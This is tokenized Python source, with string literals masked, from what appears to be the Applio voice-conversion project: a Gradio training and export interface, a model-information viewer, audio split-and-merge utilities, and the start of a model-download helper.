"<STR_LIT>" ) <EOL> pretraineds_list_g = get_pretrained_list ( "<STR_LIT>" ) <EOL> def refresh_custom_pretraineds ( ) : <EOL> return ( <EOL> { "<STR_LIT>" : sorted ( get_pretrained_list ( "<STR_LIT>" ) ) , "<STR_LIT>" : "<STR_LIT>" } , <EOL> { "<STR_LIT>" : sorted ( get_pretrained_list ( "<STR_LIT>" ) ) , "<STR_LIT>" : "<STR_LIT>" } , <EOL> ) <EOL> datasets_path = os . path . join ( now_dir , "<STR_LIT>" , "<STR_LIT>" ) <EOL> if not os . path . exists ( datasets_path ) : <EOL> os . makedirs ( datasets_path ) <EOL> datasets_path_relative = os . path . relpath ( datasets_path , now_dir ) <EOL> def get_datasets_list ( ) : <EOL> return [ <EOL> dirpath <EOL> for dirpath , _ , filenames in os . walk ( datasets_path_relative ) <EOL> if any ( filename . endswith ( tuple ( sup_audioext ) ) for filename in filenames ) <EOL> ] <EOL> def refresh_datasets ( ) : <EOL> return { "<STR_LIT>" : sorted ( get_datasets_list ( ) ) , "<STR_LIT>" : "<STR_LIT>" } <EOL> models_path = os . path . join ( now_dir , "<STR_LIT>" ) <EOL> def get_models_list ( ) : <EOL> return [ <EOL> os . path . basename ( dirpath ) <EOL> for dirpath in os . listdir ( models_path ) <EOL> if os . path . isdir ( os . path . join ( models_path , dirpath ) ) <EOL> and all ( excluded not in dirpath for excluded in [ "<STR_LIT>" , "<STR_LIT>" ] ) <EOL> ] <EOL> def refresh_models ( ) : <EOL> return { "<STR_LIT>" : sorted ( get_models_list ( ) ) , "<STR_LIT>" : "<STR_LIT>" } <EOL> def refresh_models_and_datasets ( ) : <EOL> return ( <EOL> { "<STR_LIT>" : sorted ( get_models_list ( ) ) , "<STR_LIT>" : "<STR_LIT>" } , <EOL> { "<STR_LIT>" : sorted ( get_datasets_list ( ) ) , "<STR_LIT>" : "<STR_LIT>" } , <EOL> ) <EOL> def save_drop_model ( dropbox ) : <EOL> if "<STR_LIT>" not in dropbox : <EOL> gr . Info ( <EOL> i18n ( <EOL> "<STR_LIT>" <EOL> ) <EOL> ) <EOL> else : <EOL> file_name = os . path . basename ( dropbox ) <EOL> pretrained_path = os . path . join ( pretraineds_custom_path_relative , file_name ) <EOL> if os . path . exists ( pretrained_path ) : <EOL> os . remove ( pretrained_path ) <EOL> os . rename ( dropbox , pretrained_path ) <EOL> gr . Info ( <EOL> i18n ( <EOL> "<STR_LIT>" <EOL> ) <EOL> ) <EOL> return None <EOL> def save_drop_dataset_audio ( dropbox , dataset_name ) : <EOL> if not dataset_name : <EOL> gr . Info ( "<STR_LIT>" ) <EOL> return None , None <EOL> else : <EOL> file_extension = os . path . splitext ( dropbox ) [ <NUM_LIT> ] [ <NUM_LIT> : ] . lower ( ) <EOL> if file_extension not in sup_audioext : <EOL> gr . Info ( "<STR_LIT>" ) <EOL> else : <EOL> dataset_name = format_title ( dataset_name ) <EOL> audio_file = format_title ( os . path . basename ( dropbox ) ) <EOL> dataset_path = os . path . join ( now_dir , "<STR_LIT>" , "<STR_LIT>" , dataset_name ) <EOL> if not os . path . exists ( dataset_path ) : <EOL> os . makedirs ( dataset_path ) <EOL> destination_path = os . path . join ( dataset_path , audio_file ) <EOL> if os . path . exists ( destination_path ) : <EOL> os . remove ( destination_path ) <EOL> os . rename ( dropbox , destination_path ) <EOL> gr . Info ( <EOL> i18n ( <EOL> "<STR_LIT>" <EOL> ) <EOL> ) <EOL> dataset_path = os . path . dirname ( destination_path ) <EOL> relative_dataset_path = os . path . relpath ( dataset_path , now_dir ) <EOL> return None , relative_dataset_path <EOL> def get_pth_list ( ) : <EOL> return [ <EOL> os . path . relpath ( os . path . join ( dirpath , filename ) , now_dir ) <EOL> for dirpath , _ , filenames in os . walk ( models_path ) <EOL> for filename in filenames <EOL> if filename . endswith ( "<STR_LIT>" ) <EOL> ] <EOL> def get_index_list ( ) : <EOL> return [ <EOL> os . path . relpath ( os . path . join ( dirpath , filename ) , now_dir ) <EOL> for dirpath , _ , filenames in os . walk ( models_path ) <EOL> for filename in filenames <EOL> if filename . endswith ( "<STR_LIT>" ) and "<STR_LIT>" not in filename <EOL> ] <EOL> def refresh_pth_and_index_list ( ) : <EOL> return ( <EOL> { "<STR_LIT>" : sorted ( get_pth_list ( ) ) , "<STR_LIT>" : "<STR_LIT>" } , <EOL> { "<STR_LIT>" : sorted ( get_index_list ( ) ) , "<STR_LIT>" : "<STR_LIT>" } , <EOL> ) <EOL> def export_pth ( pth_path ) : <EOL> if pth_path and os . path . exists ( pth_path ) : <EOL> return pth_path <EOL> return None <EOL> def export_index ( index_path ) : <EOL> if index_path and os . path . exists ( index_path ) : <EOL> return index_path <EOL> return None <EOL> def upload_to_google_drive ( pth_path , index_path ) : <EOL> def upload_file ( file_path ) : <EOL> if file_path : <EOL> try : <EOL> gr . Info ( f"<STR_LIT>" ) <EOL> google_drive_folder = "<STR_LIT>" <EOL> if not os . path . exists ( google_drive_folder ) : <EOL> os . makedirs ( google_drive_folder ) <EOL> google_drive_file_path = os . path . join ( <EOL> google_drive_folder , os . path . basename ( file_path ) <EOL> ) <EOL> if os . path . exists ( google_drive_file_path ) : <EOL> os . remove ( google_drive_file_path ) <EOL> shutil . copy2 ( file_path , google_drive_file_path ) <EOL> gr . Info ( "<STR_LIT>" ) <EOL> except Exception as error : <EOL> print ( error ) <EOL> gr . Info ( "<STR_LIT>" ) <EOL> upload_file ( pth_path ) <EOL> upload_file ( index_path ) <EOL> def train_tab ( ) : <EOL> with gr . Accordion ( i18n ( "<STR_LIT>" ) ) : <EOL> with gr . Row ( ) : <EOL> with gr . Column ( ) : <EOL> model_name = gr . Dropdown ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( "<STR_LIT>" ) , <EOL> choices = get_models_list ( ) , <EOL> value = "<STR_LIT>" , <EOL> interactive = True , <EOL> allow_custom_value = True , <EOL> ) <EOL> dataset_path = gr . Dropdown ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( "<STR_LIT>" ) , <EOL> choices = get_datasets_list ( ) , <EOL> allow_custom_value = True , <EOL> interactive = True , <EOL> ) <EOL> refresh = gr . Button ( i18n ( "<STR_LIT>" ) ) <EOL> dataset_creator = gr . Checkbox ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> value = False , <EOL> interactive = True , <EOL> visible = True , <EOL> ) <EOL> with gr . Column ( visible = False ) as dataset_creator_settings : <EOL> with gr . Accordion ( i18n ( "<STR_LIT>" ) ) : <EOL> dataset_name = gr . Textbox ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( "<STR_LIT>" ) , <EOL> placeholder = i18n ( "<STR_LIT>" ) , <EOL> interactive = True , <EOL> ) <EOL> upload_audio_dataset = gr . File ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> type = "<STR_LIT>" , <EOL> interactive = True , <EOL> ) <EOL> with gr . Column ( ) : <EOL> sampling_rate = gr . Radio ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( "<STR_LIT>" ) , <EOL> choices = [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] , <EOL> value = "<STR_LIT>" , <EOL> interactive = True , <EOL> ) <EOL> rvc_version = gr . Radio ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( "<STR_LIT>" ) , <EOL> choices = [ "<STR_LIT>" , "<STR_LIT>" ] , <EOL> value = "<STR_LIT>" , <EOL> interactive = True , <EOL> ) <EOL> preprocess_output_info = gr . Textbox ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( "<STR_LIT>" ) , <EOL> value = "<STR_LIT>" , <EOL> max_lines = <NUM_LIT> , <EOL> interactive = False , <EOL> ) <EOL> with gr . Row ( ) : <EOL> preprocess_button = gr . Button ( i18n ( "<STR_LIT>" ) ) <EOL> preprocess_button . click ( <EOL> run_preprocess_script , <EOL> [ model_name , dataset_path , sampling_rate ] , <EOL> preprocess_output_info , <EOL> api_name = "<STR_LIT>" , <EOL> ) <EOL> with gr . Accordion ( i18n ( "<STR_LIT>" ) ) : <EOL> with gr . Row ( ) : <EOL> hop_length = gr . Slider ( <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> step = <NUM_LIT> , <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> interactive = True , <EOL> visible = False , <EOL> ) <EOL> with gr . Row ( ) : <EOL> with gr . Column ( ) : <EOL> f0method = gr . Radio ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> choices = [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] , <EOL> value = "<STR_LIT>" , <EOL> interactive = True , <EOL> ) <EOL> extract_output_info = gr . Textbox ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( "<STR_LIT>" ) , <EOL> value = "<STR_LIT>" , <EOL> max_lines = <NUM_LIT> , <EOL> interactive = False , <EOL> ) <EOL> extract_button = gr . Button ( i18n ( "<STR_LIT>" ) ) <EOL> extract_button . click ( <EOL> run_extract_script , <EOL> [ model_name , rvc_version , f0method , hop_length , sampling_rate ] , <EOL> extract_output_info , <EOL> api_name = "<STR_LIT>" , <EOL> ) <EOL> with gr . Accordion ( i18n ( "<STR_LIT>" ) ) : <EOL> with gr . Row ( ) : <EOL> batch_size = gr . Slider ( <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> max_vram_gpu ( <NUM_LIT> ) , <EOL> step = <NUM_LIT> , <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> interactive = True , <EOL> ) <EOL> save_every_epoch = gr . Slider ( <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> step = <NUM_LIT> , <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( "<STR_LIT>" ) , <EOL> interactive = True , <EOL> ) <EOL> total_epoch = gr . Slider ( <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> step = <NUM_LIT> , <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> interactive = True , <EOL> ) <EOL> with gr . Row ( ) : <EOL> pitch_guidance = gr . Checkbox ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> value = True , <EOL> interactive = True , <EOL> ) <EOL> pretrained = gr . Checkbox ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> value = True , <EOL> interactive = True , <EOL> ) <EOL> save_only_latest = gr . Checkbox ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> value = False , <EOL> interactive = True , <EOL> ) <EOL> save_every_weights = gr . Checkbox ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> value = True , <EOL> interactive = True , <EOL> ) <EOL> custom_pretrained = gr . Checkbox ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> value = False , <EOL> interactive = True , <EOL> ) <EOL> multiple_gpu = gr . Checkbox ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = ( <EOL> i18n ( <EOL> "<STR_LIT>" <EOL> ) <EOL> ) , <EOL> value = False , <EOL> interactive = True , <EOL> ) <EOL> overtraining_detector = gr . Checkbox ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> value = False , <EOL> interactive = True , <EOL> ) <EOL> with gr . Row ( ) : <EOL> with gr . Column ( visible = False ) as pretrained_custom_settings : <EOL> with gr . Accordion ( i18n ( "<STR_LIT>" ) ) : <EOL> upload_pretrained = gr . File ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> type = "<STR_LIT>" , <EOL> interactive = True , <EOL> ) <EOL> refresh_custom_pretaineds_button = gr . Button ( <EOL> i18n ( "<STR_LIT>" ) <EOL> ) <EOL> g_pretrained_path = gr . Dropdown ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> choices = sorted ( pretraineds_list_g ) , <EOL> interactive = True , <EOL> allow_custom_value = True , <EOL> ) <EOL> d_pretrained_path = gr . Dropdown ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> choices = sorted ( pretraineds_list_d ) , <EOL> interactive = True , <EOL> allow_custom_value = True , <EOL> ) <EOL> with gr . Column ( visible = False ) as gpu_custom_settings : <EOL> with gr . Accordion ( i18n ( "<STR_LIT>" ) ) : <EOL> gpu = gr . Textbox ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> placeholder = i18n ( "<STR_LIT>" ) , <EOL> value = "<STR_LIT>" , <EOL> interactive = True , <EOL> ) <EOL> gr . Textbox ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( "<STR_LIT>" ) , <EOL> value = get_gpu_info ( ) , <EOL> interactive = False , <EOL> ) <EOL> with gr . Column ( visible = False ) as overtraining_settings : <EOL> with gr . Accordion ( i18n ( "<STR_LIT>" ) ) : <EOL> overtraining_threshold = gr . Slider ( <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> step = <NUM_LIT> , <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> interactive = True , <EOL> ) <EOL> with gr . Row ( ) : <EOL> train_output_info = gr . Textbox ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( "<STR_LIT>" ) , <EOL> value = "<STR_LIT>" , <EOL> max_lines = <NUM_LIT> , <EOL> interactive = False , <EOL> ) <EOL> with gr . Row ( ) : <EOL> train_button = gr . Button ( i18n ( "<STR_LIT>" ) ) <EOL> train_button . click ( <EOL> run_train_script , <EOL> [ <EOL> model_name , <EOL> rvc_version , <EOL> save_every_epoch , <EOL> save_only_latest , <EOL> save_every_weights , <EOL> total_epoch , <EOL> sampling_rate , <EOL> batch_size , <EOL> gpu , <EOL> pitch_guidance , <EOL> overtraining_detector , <EOL> overtraining_threshold , <EOL> pretrained , <EOL> custom_pretrained , <EOL> g_pretrained_path , <EOL> d_pretrained_path , <EOL> ] , <EOL> train_output_info , <EOL> api_name = "<STR_LIT>" , <EOL> ) <EOL> stop_train_button = gr . Button ( <EOL> i18n ( "<STR_LIT>" ) , visible = False <EOL> ) <EOL> stop_train_button . click ( <EOL> fn = restart_applio , <EOL> inputs = [ ] , <EOL> outputs = [ ] , <EOL> ) <EOL> index_button = gr . Button ( i18n ( "<STR_LIT>" ) ) <EOL> index_button . click ( <EOL> run_index_script , <EOL> [ model_name , rvc_version ] , <EOL> train_output_info , <EOL> api_name = "<STR_LIT>" , <EOL> ) <EOL> with gr . Accordion ( i18n ( "<STR_LIT>" ) , open = False ) : <EOL> if not os . name == "<STR_LIT>" : <EOL> gr . Markdown ( <EOL> i18n ( <EOL> "<STR_LIT>" <EOL> ) <EOL> ) <EOL> with gr . Row ( ) : <EOL> with gr . Column ( ) : <EOL> pth_file_export = gr . File ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> type = "<STR_LIT>" , <EOL> value = None , <EOL> interactive = False , <EOL> ) <EOL> pth_dropdown_export = gr . Dropdown ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( "<STR_LIT>" ) , <EOL> choices = get_pth_list ( ) , <EOL> value = None , <EOL> interactive = True , <EOL> allow_custom_value = True , <EOL> ) <EOL> with gr . Column ( ) : <EOL> index_file_export = gr . File ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> type = "<STR_LIT>" , <EOL> value = None , <EOL> interactive = False , <EOL> ) <EOL> index_dropdown_export = gr . Dropdown ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( "<STR_LIT>" ) , <EOL> choices = get_index_list ( ) , <EOL> value = None , <EOL> interactive = True , <EOL> allow_custom_value = True , <EOL> ) <EOL> with gr . Row ( ) : <EOL> with gr . Column ( ) : <EOL> refresh_export = gr . Button ( i18n ( "<STR_LIT>" ) ) <EOL> if not os . name == "<STR_LIT>" : <EOL> upload_exported = gr . Button ( i18n ( "<STR_LIT>" ) , variant = "<STR_LIT>" ) <EOL> upload_exported . click ( <EOL> fn = upload_to_google_drive , <EOL> inputs = [ pth_dropdown_export , index_dropdown_export ] , <EOL> outputs = [ ] , <EOL> ) <EOL> def toggle_visible ( checkbox ) : <EOL> return { "<STR_LIT>" : checkbox , "<STR_LIT>" : "<STR_LIT>" } <EOL> def toggle_visible_hop_length ( f0method ) : <EOL> if f0method == "<STR_LIT>" or f0method == "<STR_LIT>" : <EOL> return { "<STR_LIT>" : True , "<STR_LIT>" : "<STR_LIT>" } <EOL> return { "<STR_LIT>" : False , "<STR_LIT>" : "<STR_LIT>" } <EOL> def toggle_pretrained ( pretrained , custom_pretrained ) : <EOL> if custom_pretrained == False : <EOL> return { "<STR_LIT>" : pretrained , "<STR_LIT>" : "<STR_LIT>" } , { <EOL> "<STR_LIT>" : False , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> } <EOL> else : <EOL> return { "<STR_LIT>" : pretrained , "<STR_LIT>" : "<STR_LIT>" } , { <EOL> "<STR_LIT>" : pretrained , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> } <EOL> def enable_stop_train_button ( ) : <EOL> return { "<STR_LIT>" : False , "<STR_LIT>" : "<STR_LIT>" } , { <EOL> "<STR_LIT>" : True , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> } <EOL> def disable_stop_train_button ( ) : <EOL> return { "<STR_LIT>" : True , "<STR_LIT>" : "<STR_LIT>" } , { <EOL> "<STR_LIT>" : False , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> } <EOL> def download_prerequisites ( version ) : <EOL> for remote_folder , file_list in pretraineds_v1 : <EOL> local_folder = folder_mapping . get ( remote_folder , "<STR_LIT>" ) <EOL> missing = False <EOL> for file in file_list : <EOL> destination_path = os . path . join ( local_folder , file ) <EOL> if not os . path . exists ( destination_path ) : <EOL> missing = True <EOL> if version == "<STR_LIT>" and missing == True : <EOL> gr . Info ( <EOL> "<STR_LIT>" <EOL> ) <EOL> run_prerequisites_script ( "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ) <EOL> gr . Info ( <EOL> "<STR_LIT>" <EOL> ) <EOL> rvc_version . change ( <EOL> fn = download_prerequisites , <EOL> inputs = [ rvc_version ] , <EOL> outputs = [ ] , <EOL> ) <EOL> refresh . click ( <EOL> fn = refresh_models_and_datasets , <EOL> inputs = [ ] , <EOL> outputs = [ model_name , dataset_path ] , <EOL> ) <EOL> dataset_creator . change ( <EOL> fn = toggle_visible , <EOL> inputs = [ dataset_creator ] , <EOL> outputs = [ dataset_creator_settings ] , <EOL> ) <EOL> upload_audio_dataset . upload ( <EOL> fn = save_drop_dataset_audio , <EOL> inputs = [ upload_audio_dataset , dataset_name ] , <EOL> outputs = [ upload_audio_dataset , dataset_path ] , <EOL> ) <EOL> f0method . change ( <EOL> fn = toggle_visible_hop_length , <EOL> inputs = [ f0method ] , <EOL> outputs = [ hop_length ] , <EOL> ) <EOL> pretrained . change ( <EOL> fn = toggle_pretrained , <EOL> inputs = [ pretrained , custom_pretrained ] , <EOL> outputs = [ custom_pretrained , pretrained_custom_settings ] , <EOL> ) <EOL> custom_pretrained . change ( <EOL> fn = toggle_visible , <EOL> inputs = [ custom_pretrained ] , <EOL> outputs = [ pretrained_custom_settings ] , <EOL> ) <EOL> refresh_custom_pretaineds_button . click ( <EOL> fn = refresh_custom_pretraineds , <EOL> inputs = [ ] , <EOL> outputs = [ g_pretrained_path , d_pretrained_path ] , <EOL> ) <EOL> upload_pretrained . upload ( <EOL> fn = save_drop_model , <EOL> inputs = [ upload_pretrained ] , <EOL> outputs = [ upload_pretrained ] , <EOL> ) <EOL> overtraining_detector . change ( <EOL> fn = toggle_visible , <EOL> inputs = [ overtraining_detector ] , <EOL> outputs = [ overtraining_settings ] , <EOL> ) <EOL> multiple_gpu . change ( <EOL> fn = toggle_visible , <EOL> inputs = [ multiple_gpu ] , <EOL> outputs = [ gpu_custom_settings ] , <EOL> ) <EOL> train_button . click ( <EOL> fn = enable_stop_train_button , <EOL> inputs = [ ] , <EOL> outputs = [ train_button , stop_train_button ] , <EOL> ) <EOL> train_output_info . change ( <EOL> fn = disable_stop_train_button , <EOL> inputs = [ ] , <EOL> outputs = [ train_button , stop_train_button ] , <EOL> ) <EOL> pth_dropdown_export . change ( <EOL> fn = export_pth , <EOL> inputs = [ pth_dropdown_export ] , <EOL> outputs = [ pth_file_export ] , <EOL> ) <EOL> index_dropdown_export . change ( <EOL> fn = export_index , <EOL> inputs = [ index_dropdown_export ] , <EOL> outputs = [ index_file_export ] , <EOL> ) <EOL> refresh_export . click ( <EOL> fn = refresh_pth_and_index_list , <EOL> inputs = [ ] , <EOL> outputs = [ pth_dropdown_export , index_dropdown_export ] , <EOL> ) <EOL> </s>
<s> import os , sys <EOL> now_dir = os . getcwd ( ) <EOL> sys . path . append ( now_dir ) <EOL> from core import run_model_information_script <EOL> from assets . i18n . i18n import I18nAuto <EOL> i18n = I18nAuto ( ) <EOL> import gradio as gr <EOL> def processing ( ) : <EOL> with gr . Accordion ( label = i18n ( "<STR_LIT>" ) ) : <EOL> with gr . Row ( ) : <EOL> with gr . Column ( ) : <EOL> model_view_model_path = gr . Textbox ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( "<STR_LIT>" ) , <EOL> value = "<STR_LIT>" , <EOL> interactive = True , <EOL> placeholder = i18n ( "<STR_LIT>" ) , <EOL> ) <EOL> model_view_output_info = gr . Textbox ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( "<STR_LIT>" ) , <EOL> value = "<STR_LIT>" , <EOL> max_lines = <NUM_LIT> , <EOL> ) <EOL> model_view_button = gr . Button ( i18n ( "<STR_LIT>" ) , variant = "<STR_LIT>" ) <EOL> model_view_button . click ( <EOL> run_model_information_script , <EOL> [ model_view_model_path ] , <EOL> model_view_output_info , <EOL> api_name = "<STR_LIT>" , <EOL> ) <EOL> </s>
<s> from pydub . silence import detect_nonsilent <EOL> from pydub import AudioSegment <EOL> import numpy as np <EOL> import re <EOL> import os <EOL> from rvc . lib . utils import format_title <EOL> def process_audio ( file_path ) : <EOL> try : <EOL> song = AudioSegment . from_file ( file_path ) <EOL> silence_thresh = - <NUM_LIT> <EOL> min_silence_len = <NUM_LIT> <EOL> nonsilent_parts = detect_nonsilent ( <EOL> song , min_silence_len = min_silence_len , silence_thresh = silence_thresh <EOL> ) <EOL> file_dir = os . path . dirname ( file_path ) <EOL> file_name = os . path . basename ( file_path ) . split ( "<STR_LIT>" ) [ <NUM_LIT> ] <EOL> file_name = format_title ( file_name ) <EOL> new_dir_path = os . path . join ( file_dir , file_name ) <EOL> os . makedirs ( new_dir_path , exist_ok = True ) <EOL> timestamps_file = os . path . join ( file_dir , f"<STR_LIT>" ) <EOL> if os . path . isfile ( timestamps_file ) : <EOL> os . remove ( timestamps_file ) <EOL> segment_count = <NUM_LIT> <EOL> for i , ( start_i , end_i ) in enumerate ( nonsilent_parts ) : <EOL> chunk = song [ start_i : end_i ] <EOL> chunk_file_path = os . path . join ( new_dir_path , f"<STR_LIT>" ) <EOL> chunk . export ( chunk_file_path , format = "<STR_LIT>" ) <EOL> print ( f"<STR_LIT>" ) <EOL> segment_count += <NUM_LIT> <EOL> with open ( timestamps_file , "<STR_LIT>" , encoding = "<STR_LIT>" ) as f : <EOL> f . write ( f"<STR_LIT>" ) <EOL> print ( f"<STR_LIT>" ) <EOL> print ( f"<STR_LIT>" ) <EOL> return "<STR_LIT>" , new_dir_path <EOL> except Exception as e : <EOL> print ( f"<STR_LIT>" ) <EOL> return "<STR_LIT>" , None <EOL> def merge_audio ( timestamps_file ) : <EOL> try : <EOL> prefix = os . path . basename ( timestamps_file ) . replace ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> timestamps_dir = os . path . dirname ( timestamps_file ) <EOL> with open ( timestamps_file , "<STR_LIT>" , encoding = "<STR_LIT>" ) as f : <EOL> lines = f . readlines ( ) <EOL> audio_segments = [ ] <EOL> last_end_time = <NUM_LIT> <EOL> print ( f"<STR_LIT>" ) <EOL> for line in lines : <EOL> match = re . search ( r"<STR_LIT>" , line ) <EOL> if match : <EOL> filename , start_time = match . groups ( ) <EOL> start_time = int ( start_time ) <EOL> chunk_file = os . path . join ( timestamps_dir , prefix , filename ) <EOL> silence_duration = max ( start_time - last_end_time , <NUM_LIT> ) <EOL> silence = AudioSegment . silent ( duration = silence_duration ) <EOL> audio_segments . append ( silence ) <EOL> audio = AudioSegment . from_wav ( chunk_file ) <EOL> audio_segments . append ( audio ) <EOL> last_end_time = start_time + len ( audio ) <EOL> print ( f"<STR_LIT>" ) <EOL> merged_audio = sum ( audio_segments ) <EOL> merged_audio_np = np . array ( merged_audio . get_array_of_samples ( ) ) <EOL> return merged_audio . frame_rate , merged_audio_np <EOL> except Exception as e : <EOL> print ( f"<STR_LIT>" ) <EOL> </s>
<s> import gradio as gr <EOL> import tabs . extra . processing . processing as processing <EOL> import tabs . extra . analyzer . analyzer as analyzer <EOL> from assets . i18n . i18n import I18nAuto <EOL> i18n = I18nAuto ( ) <EOL> def extra_tab ( ) : <EOL> gr . Markdown ( <EOL> value = i18n ( <EOL> "<STR_LIT>" <EOL> ) <EOL> ) <EOL> with gr . TabItem ( i18n ( "<STR_LIT>" ) ) : <EOL> processing . processing ( ) <EOL> with gr . TabItem ( i18n ( "<STR_LIT>" ) ) : <EOL> analyzer . analyzer ( ) <EOL> </s>
<s> import torch <EOL> from datetime import datetime <EOL> def prettify_date ( date_str ) : <EOL> date_time_obj = datetime . strptime ( date_str , "<STR_LIT>" ) <EOL> return date_time_obj . strftime ( "<STR_LIT>" ) <EOL> def model_information ( path ) : <EOL> model_data = torch . load ( path , map_location = "<STR_LIT>" ) <EOL> print ( f"<STR_LIT>" ) <EOL> epochs = model_data . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> steps = model_data . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> sr = model_data . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> f0 = model_data . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> version = model_data . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> creation_date = model_data . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> model_hash = model_data . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> pitch_guidance = "<STR_LIT>" if f0 == <NUM_LIT> else "<STR_LIT>" <EOL> return ( <EOL> f"<STR_LIT>" <EOL> f"<STR_LIT>" <EOL> f"<STR_LIT>" <EOL> f"<STR_LIT>" <EOL> f"<STR_LIT>" <EOL> f"<STR_LIT>" <EOL> f"<STR_LIT>" <EOL> ) <EOL> </s>
<s> import os <EOL> import sys <EOL> import wget <EOL> import zipfile <EOL> from bs4 import BeautifulSoup <EOL> import requests <EOL> from urllib . parse import unquote , urlencode , parse_qs , urlparse <EOL> import re <EOL> import shutil <EOL> import six <EOL> def find_folder_parent ( search_dir , folder_name ) : <EOL> for dirpath , dirnames , _ in os . walk ( search_dir ) : <EOL> if folder_name in dirnames : <EOL> return os . path . abspath ( dirpath ) <EOL> return None <EOL> now_dir = os . getcwd ( ) <EOL> sys . path . append ( now_dir ) <EOL> from rvc . lib . utils import format_title <EOL> from rvc . lib . tools import gdown <EOL> file_path = find_folder_parent ( now_dir , "<STR_LIT>" ) <EOL> zips_path = os . getcwd ( ) + "<STR_LIT>" <EOL> def search_pth_index ( folder ) : <EOL> pth_paths = [ <EOL> os . path . join ( folder , file ) <EOL> for file in os . listdir ( folder ) <EOL> if os . path . isfile ( os . path . join ( folder , file ) ) and file . endswith ( "<STR_LIT>" ) <EOL> ] <EOL> index_paths = [ <EOL> os . path . join ( folder , file ) <EOL> for file in os . listdir ( folder ) <EOL> if os . path . isfile ( os . path . join ( folder , file ) ) and file . endswith ( "<STR_LIT>" ) <EOL> ] <EOL> return pth_paths , index_paths <EOL> def get_mediafire_download_link ( url ) : <EOL> response = requests . get ( url ) <EOL> response . raise_for_status ( ) <EOL> soup = BeautifulSoup ( response . text , "<STR_LIT>" ) <EOL> download_button = soup . find ( <EOL> "<STR_LIT>" , { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : "<STR_LIT>" } <EOL> ) <EOL> if download_button : <EOL> download_link = download_button . get ( "<STR_LIT>" ) <EOL> return download_link <EOL> else : <EOL> return None <EOL> def download_from_url ( url ) : <EOL> os . makedirs ( zips_path , exist_ok = True ) <EOL> if url != "<STR_LIT>" : <EOL> if "<STR_LIT>" in url : <EOL> if "<STR_LIT>" in url : <EOL> file_id = url . split ( "<STR_LIT>" ) [ <NUM_LIT> ] . split ( "<STR_LIT>" ) [ <NUM_LIT> ] 